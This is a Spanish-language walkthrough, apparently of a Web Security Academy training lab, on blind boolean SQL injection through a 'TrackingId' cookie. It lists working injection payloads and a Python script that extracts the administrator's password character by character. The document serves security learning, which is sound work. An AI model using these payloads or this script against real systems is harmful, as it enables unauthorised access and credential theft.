
La cookie de session "TrackingId"  es vulnerable a SQLI

* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' union select NULL-- -
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' and 1=1-- - (True)
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' and 'a'='a'-- - (True)
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' and (select 'a')='a'-- - (True)
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' and (select 'b')='a'-- - (False)
* Cookie: TrackingId=sS0Qz9nx8FBcjUMr' and (select 'a' from users where username='administrator')='a'-- -
    * Si esto "select 'a' from users where username='administrator'" existe devuelve la letra "a"
    * Si es falso, no devuelve "a"
* cookie_value' and (select substring(username,1,1) from users where username='administrator')='a'-- -
    * Esto es verdadero si el primer caracter del usuario es "a"
    * Falso si no existe

Se comienda primero debemos de saber cuantos caracteres tiene la contraseña
* cookie_value' and (select 'a' from users where username='administrator' and length(password) >10)='a'-- -
* cookie_value' and (select 'a' from users where username='administrator' and length(password) >20)='a'-- -
* cookie_value' and (select 'a' from users where username='administrator' and length(password) >=20)='a'-- -


Script en Python para minar la contraseña del usuario "Administrator":


```python
from pwn import *
from termcolor import colored
import requests
import sys
import signal
import string
import time


def def_handler(sys, frame):
    print(colored("\n\n[!] Saliendo....\n",'red'))
    exit(1)

signal.signal(signal.SIGINT, def_handler)

characteres = string.ascii_lowercase + string.digits #"a-z" y "0-9"
main_url = "https://0a8b00770465c3a081e875a800e40044.web-security-academy.net"

def makeRequest():

    p1 = log.progress("SQLI")
    p1.status("Iniciando Ataque de Fuerza Bruta")

    time.sleep(2)

    password=""

    p2 = log.progress("Password:")

    for position in range(1,21):
        for character in characteres:
            cookies = {
                    'TrackingId':f"BCpP9o0mbYNs1DCH' and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -",
                    'session':'soVwrxtWtMEn60HHZjpZApVEYbX1AIOt'
            }
            #print (cookies["TrackingId"]) Para probar como esta haciendo cada query en cada posicion

            p1.status(cookies["TrackingId"])

            r = requests.get(main_url,cookies=cookies)

        
            if "Welcome back" in r.text:
                password+=character
                p2.status(password)
                break

if __name__ == '__main__':
    makeRequest()

```
